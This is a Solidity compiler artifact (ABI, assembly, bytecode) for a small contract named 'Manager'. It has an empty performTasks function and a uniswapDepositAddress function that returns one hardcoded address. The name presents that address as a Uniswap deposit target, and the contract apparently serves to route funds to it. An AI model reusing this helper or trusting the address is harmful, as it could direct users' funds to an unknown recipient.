{
	"ipfs://QmZhUQKp227JdKKufGT81RpgnSGpvy1rgT7YNvP394A2nA": {
		"Manager": {
			"abi": [
				{
					"inputs": [],
					"name": "performTasks",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "uniswapDepositAddress",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "pure",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"ipfs://QmZhUQKp227JdKKufGT81RpgnSGpvy1rgT7YNvP394A2nA\":27:221  contract Manager {\r... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"ipfs://QmZhUQKp227JdKKufGT81RpgnSGpvy1rgT7YNvP394A2nA\":27:221  contract Manager {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x0c0f93a1\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xfeae9ad3\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"ipfs://QmZhUQKp227JdKKufGT81RpgnSGpvy1rgT7YNvP394A2nA\":48:91  function performTasks() public {\r... */\n    tag_3:\n      tag_5\n      tag_6\n      jump\t// in\n    tag_5:\n      stop\n        /* \"ipfs://QmZhUQKp227JdKKufGT81RpgnSGpvy1rgT7YNvP394A2nA\":96:218  function uniswapDepositAddress() public pure returns (address) {\r... */\n    tag_4:\n      tag_7\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"ipfs://QmZhUQKp227JdKKufGT81RpgnSGpvy1rgT7YNvP394A2nA\":48:91  function performTasks() public {\r... */\n    tag_6:\n      jump\t// out\n        /* \"ipfs://QmZhUQKp227JdKKufGT81RpgnSGpvy1rgT7YNvP394A2nA\":96:218  function uniswapDepositAddress() public pure returns (address) {\r... */\n    tag_8:\n        /* \"ipfs://QmZhUQKp227JdKKufGT81RpgnSGpvy1rgT7YNvP394A2nA\":150:157  address */\n      0x00\n        /* \"ipfs://QmZhUQKp227JdKKufGT81RpgnSGpvy1rgT7YNvP394A2nA\":171:213  0x4443710D38849FEF5b5346F8A492B0043d7f7d82 */\n      0x4443710d38849fef5b5346f8a492b0043d7f7d82\n        /* \"ipfs://QmZhUQKp227JdKKufGT81RpgnSGpvy1rgT7YNvP394A2nA\":164:213  return 0x4443710D38849FEF5b5346F8A492B0043d7f7d82 */\n      swap1\n      pop\n        /* \"ipfs://QmZhUQKp227JdKKufGT81RpgnSGpvy1rgT7YNvP394A2nA\":96:218  function uniswapDepositAddress() public pure returns (address) {\r... */\n      swap1\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220385be30d61936e5855a6bf0044501c73f12feebb7cbbe0bc460559d220d6804864736f6c634300060b0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b5060db8061001f6000396000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c80630c0f93a1146037578063feae9ad314603f575b600080fd5b603d6087565b005b60456089565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b565b6000734443710d38849fef5b5346f8a492b0043d7f7d8290509056fea2646970667358221220385be30d61936e5855a6bf0044501c73f12feebb7cbbe0bc460559d220d6804864736f6c634300060b0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0xDB DUP1 PUSH2 0x1F PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x32 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xC0F93A1 EQ PUSH1 0x37 JUMPI DUP1 PUSH4 0xFEAE9AD3 EQ PUSH1 0x3F JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x3D PUSH1 0x87 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x45 PUSH1 0x89 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST JUMP JUMPDEST PUSH1 0x0 PUSH20 0x4443710D38849FEF5B5346F8A492B0043D7F7D82 SWAP1 POP SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CODESIZE JUMPDEST 0xE3 0xD PUSH2 0x936E PC SSTORE 0xA6 0xBF STOP DIFFICULTY POP SHR PUSH20 0xF12FEEBB7CBBE0BC460559D220D6804864736F6C PUSH4 0x4300060B STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "43800",
						"executionCost": "93",
						"totalCost": "43893"
					},
					"external": {
						"performTasks()": "122",
						"uniswapDepositAddress()": "225"
					}
				},
				"methodIdentifiers": {
					"performTasks()": "0c0f93a1",
					"uniswapDepositAddress()": "feae9ad3"
				}
			},
			"storageLayout": {
				"storage": [],
				"types": null
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}